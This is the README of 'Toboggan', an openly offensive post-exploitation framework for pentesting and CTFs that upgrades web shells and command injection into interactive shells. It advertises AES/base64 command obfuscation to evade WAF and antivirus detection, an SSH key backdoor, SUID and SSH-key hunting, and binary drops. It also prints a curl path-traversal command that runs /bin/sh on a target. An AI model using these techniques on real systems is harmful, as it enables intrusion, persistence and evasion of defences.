# 🛝 Toboggan

A Python post-exploitation framework that turns web shells, command injection, and blind RCE into a semi-interactive shell on Linux and Windows targets.

<p align="center">
    <img src="/media/example.jpg" alt="toboggan post-exploitation shell example">
</p>

Toboggan bridges the gap between having Remote Code Execution (RCE) and having a usable shell. It wraps any arbitrary command execution primitive into an interactive session with tab completion, history, and modular post-exploitation actions. When a reverse shell is not an option (firewall, NAT, outbound filtering), the built-in forward shell using named pipes (`mkfifo`) gives you stdin/stdout communication through the same HTTP channel.

- **Input sources**: web shells (PHP, ASP, JSP), command injection, HTTP-based RCE, blind command execution, SQL injection with `xp_cmdshell`, or any custom Python `execute()` function
- **Forward shell**: named-pipe (`mkfifo`) semi-interactive session for firewalled targets with no outbound connectivity
- **Obfuscation**: AES encryption or base64 encoding of every command to bypass WAF and AV detection
- **Modular actions**: built-in post-exploitation actions for Linux and Windows (file transfer, privilege escalation, SSH backdoor, SUID hunting, shell upgrade, and more)
- **Bring Your Own Module**: point toboggan at any Python script that exposes an `execute(command, timeout)` function

## 📦 Installation

Prefer using [`uv`](https://docs.astral.sh/uv/), a fast Python package manager that installs tools in isolated environments. Alternatively, [`pipx`](https://pypa.github.io/pipx/) or `pip` work as well.

### With [uv](https://docs.astral.sh/uv/) (recommended)

[`uv tool install`](https://docs.astral.sh/uv/guides/tools/#installing-tools) persistently installs the tool and adds it to your `PATH`, similar to `pipx`:

```bash
uv tool install git+https://github.com/n3rada/toboggan.git
```

After installation, `toboggan` is available directly:

```bash
toboggan --help
```

To upgrade later:

```bash
uv tool upgrade toboggan
```

> [!TIP]
> You can also run `toboggan` **without installing** it using [`uvx`](https://docs.astral.sh/uv/guides/tools/#running-tools) (alias for `uv tool run`), which creates a temporary isolated environment on the fly:
> ```bash
> uvx --from git+https://github.com/n3rada/toboggan.git toboggan --help
> ```

To inject an extra dependency (e.g., a database driver needed by your RCE module):

```bash
uv tool install git+https://github.com/n3rada/toboggan.git --with pyrfc==3.3.1
```

### With [`pipx`](https://pypa.github.io/pipx/)

> [!NOTE]
> `pipx` installs Python applications in isolated virtual environments, which means they do not have access to system-wide packages by default (like `psycopg2`).

```bash
pipx install 'git+https://github.com/n3rada/toboggan.git'
```

To use system site packages, pass `--system-site-packages`:
```bash
pipx install --system-site-packages 'git+https://github.com/n3rada/toboggan.git'
```

Or inject a dependency directly:
```bash
pipx inject toboggan pyrfc==3.3.1
```

### With pip

```bash
pip install 'git+https://github.com/n3rada/toboggan.git'
```

## 🧸 Usage

```shell
toboggan <module> [options]
toboggan --exec-wrapper '<command_template>'
toboggan --request <burp_file>
```

Upgrade your web shell or command injection to an interactive shell:
```shell
toboggan ~/phpexploit.py
```

### 🌐 Proxy

Forward traffic through any HTTP(S) proxy:

```shell
toboggan ~/phpexploit.py --proxy http://squideu.<something>.io:3128
```

Route through [Burp Suite](https://portswigger.net/burp) (defaults to `http://127.0.0.1:8080`):
```shell
toboggan ~/phpexploit.py --proxy
```

### 📄 Burp Suite Request Import

Directly import a Burp saved request containing the `||cmd||` placeholder:
```shell
toboggan --request burp_request.xml
```

> [!TIP]
> In Burp Suite, right-click a request → **Save item**, then add `||cmd||` where the command should be injected (URL, headers, or body).

### 🧰 Wrap a Shell Command

Wrap any shell command that accepts a command injection point:
```shell
toboggan --exec-wrapper 'curl -s --path-as-is -d "echo Content-Type: text/plain; echo; ||cmd||" "http://192.168.216.188/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"'
```

### 🔐 Obfuscation

Obfuscate all commands using AES encryption or base64 encoding to evade detection:
```shell
toboggan ~/phpexploit.py --obfuscate --os "linux"
```

Base64-encode every command before execution:
```shell
toboggan ~/phpexploit.py -b64
```

## 🏗️ Forward Shell (Named Pipes)

Toboggan upgrades dumb web shells into semi-interactive shells using named pipes (FIFO) for inter-process communication. This forward shell technique is invaluable when:

- You can't get a reverse shell due to firewall restrictions
- Target is behind NAT or multiple proxies
- Working with HTTP-only RCE channels (web shells, command injection)
- Dealing with blind command execution that doesn't return output immediately
- You need an interactive shell without opening connections back to your machine

```shell
toboggan ~/phpexploit.py --fifo
```

The forward shell uses `mkfifo` under the hood to create a pseudo-TTY experience, even in heavily restricted environments. This enables interactive commands that require stdin/stdout communication such as `sudo -l` and any scripts using `read` that expect real-time user input.

Combine with obfuscation for maximum stealth:
```shell
toboggan ~/phpexploit.py --obfuscate --fifo --os "linux"
```

> [!WARNING]
> Ctrl+C is not forwarded. Control characters only work in real TTY/PTY environments.

### ⚙️ Named Pipe Options

| Flag | Description |
|---|---|
| `--fifo` | Start a semi-interactive FIFO session |
| `-ri`, `--read-interval` | Polling interval in seconds (default: `0.3`) |
| `-i`, `--stdin` | Custom input path for the FIFO pipe |
| `-o`, `--stdout` | Custom output path for the FIFO pipe |
| `--shell` | Shell binary for named pipe execution (e.g., `/bin/bash`) |

## 🔍 RCE Module Interface

An RCE module is a Python script that defines how commands are sent to and executed on a remote system. To be compatible with Toboggan, your module must define a function with this exact signature:

```python
def execute(command: str, timeout: float) -> str:
    """
    Execute a command remotely and return the output.

    Args:
        command (str): The command to execute.
        timeout (float): Execution timeout.

    Returns:
        str: The command output.
    """
```

This function is called internally by Toboggan using [`modwrap`](https://pypi.org/project/modwrap/) under the hood.

### 💡 Considerations

Your `execute()` function must handle all quirks of the target system:

- If space characters need to be replaced (e.g., with `${IFS}`), handle that inside the function
- If special encoding is required (e.g., `base64`, `hex`), apply it before sending
- If the system echoes extra characters or wraps the output, sanitize it
- If the remote interface is slow or unreliable, tune the timeout

The goal is for Toboggan to call your `execute()` function with any arbitrary command and get the correct output, as if you typed it in a shell.

## 🛠️ Built-in Actions

Actions are modular plugins executed via the `!` prefix inside the terminal session. Use `!help` to list all available actions.

### 🐧 Linux Actions

| Action | Description |
|---|---|
| [`download`](src/toboggan/core/actions/download/linux.py) | Retrieve a file remotely, compress it, and save it locally |
| [`upload`](src/toboggan/core/actions/upload/linux.py) | Compress, encode, and upload a local file to the remote system |
| [`fifo`](src/toboggan/core/actions/fifo/linux.py) | Start a semi-interactive session using named pipes |
| [`hide`](src/toboggan/core/actions/hide/linux.py) / [`unhide`](src/toboggan/core/actions/unhide/linux.py) | Obfuscate/deobfuscate commands (AES or base64) |
| [`upgrade`](src/toboggan/core/actions/upgrade/linux.py) | Attempt to upgrade a limited shell to a TTY |
| [`netcheck`](src/toboggan/core/actions/netcheck/linux.py) | Check outbound connectivity (ICMP, DNS, HTTP) |
| [`ip`](src/toboggan/core/actions/ip/linux.py) | Display network interfaces and IP addresses |
| [`users`](src/toboggan/core/actions/users/linux.py) | Enumerate system users |
| [`history`](src/toboggan/core/actions/history/linux.py) | Retrieve all users' shell command history |
| [`path`](src/toboggan/core/actions/path/linux.py) | List remote system's PATH entries |
| [`privbins`](src/toboggan/core/actions/privbins/linux.py) | Find SUID/SGID binaries for privilege escalation |
| [`read_others`](src/toboggan/core/actions/read_others/linux.py) | Scan other users' home directories for readable files |
| [`ssh_find`](src/toboggan/core/actions/ssh_find/linux.py) | Search for SSH private keys on the system |
| [`ssh_backdoor`](src/toboggan/core/actions/ssh_backdoor/linux.py) | Generate and drop an SSH key into a user's `.ssh` directory |
| [`peas`](src/toboggan/core/actions/peas/linux.py) | Upload and execute [linpeas.sh](https://github.com/peass-ng/PEASS-ng) on the target |
| [`kube_check`](src/toboggan/core/actions/kube_check/linux.py) | Check for Kubernetes environment indicators |
| [`drop_bin`](src/toboggan/core/actions/drop_bin/linux.py) | Upload a binary to the target and make it executable |
| [`drop_static`](src/toboggan/core/actions/drop_static/linux.py) | Drop a prebuilt static binary (curl, kubectl) |

### 🪟 Windows Actions

| Action | Description |
|---|---|
| [`download`](src/toboggan/core/actions/download/windows.py) | Retrieve a file remotely |
| [`upload`](src/toboggan/core/actions/upload/windows.py) | Encode and upload a local file |
| [`netcheck`](src/toboggan/core/actions/netcheck/windows.py) | Check outbound connectivity |
| [`history`](src/toboggan/core/actions/history/windows.py) | Retrieve shell command history |
| [`hide`](src/toboggan/core/actions/hide/windows.py) / [`unhide`](src/toboggan/core/actions/unhide/windows.py) | Obfuscate/deobfuscate commands |

## 🧩 Bring Your Own Actions (BYOA)

Custom actions can be placed in the user action directory. Toboggan loads user actions with priority over built-in ones, allowing you to override or extend functionality.

| Platform | Path |
|---|---|
| Linux/macOS | `$XDG_DATA_HOME/toboggan/actions/` (default: `~/.local/share/toboggan/actions/`) |
| Windows | `%LOCALAPPDATA%\toboggan\actions\` |

Each action is a Python file inside a subdirectory named after the action, with OS-specific implementations:

```
actions/
  my_action/
    linux.py    # Linux implementation
    windows.py  # Windows implementation (optional)
```

Your action class must inherit from `BaseAction` and implement the `run()` method. See [DEVELOPMENT.md](DEVELOPMENT.md) for the full guide on creating actions.

## 📂 Data Storage

Toboggan follows [XDG Base Directory](https://specifications.freedesktop.org/basedir-spec/latest/) conventions on Linux:

| Purpose | Linux Path | Windows Path |
|---|---|---|
| **User actions** | `$XDG_DATA_HOME/toboggan/actions/` | `%LOCALAPPDATA%\toboggan\actions\` |
| **Logs** | `$XDG_STATE_HOME/toboggan/logs/` | `%LOCALAPPDATA%\toboggan\logs\` |
| **Command history** | `$XDG_STATE_HOME/toboggan/history/` | `%LOCALAPPDATA%\toboggan\history\` |
| **Cached binaries** | `$XDG_CACHE_HOME/toboggan/binaries/` | `%LOCALAPPDATA%\toboggan\binaries\` |

> [!TIP]
> Override the log directory with the `TOBOGGAN_LOG_DIR` environment variable.

## ❓ Help

```shell
toboggan --help              # Show all CLI options
toboggan ~/exploit.py        # Then type !help for available actions
toboggan ~/exploit.py        # Then type !<action> -h for action-specific help
```

### 🔧 Terminal Built-in Commands

| Command | Description |
|---|---|
| `!help` (`!h`) | Show available actions and built-in commands |
| `!exit` (`!e`, `!ex`) | Exit the terminal session |
| `!size [bytes]` | Probe or set max command size |
| `!debug` | Toggle debug logging |
| `!trace` | Toggle trace logging |
| `!paths` | Show custom paths and command location cache |
| `!paths add <paths>` | Add custom paths for command lookup |
| `!paths clear` | Clear the command location cache |

## ⚠️ Disclaimer

Toboggan is intended for use in legal penetration testing, Capture The Flag (CTF) competitions, or other authorized and ethical security assessments.

Acceptable environments include:
- Private lab environments you control (local VMs, isolated networks)
- Sanctioned learning platforms (CTFs, Hack The Box, OffSec exam scenarios)
- Formal penetration-test or red-team engagements with documented customer consent

Misuse of this project may result in legal action.

## ⚖️ Legal Notice

Any unauthorized use of this tool in real-world environments or against systems without explicit permission from the system owner is strictly prohibited and may violate legal and ethical standards. The creators and contributors of this tool are not responsible for any misuse or damage caused.

Use responsibly and ethically. Always respect the law and obtain proper authorization.
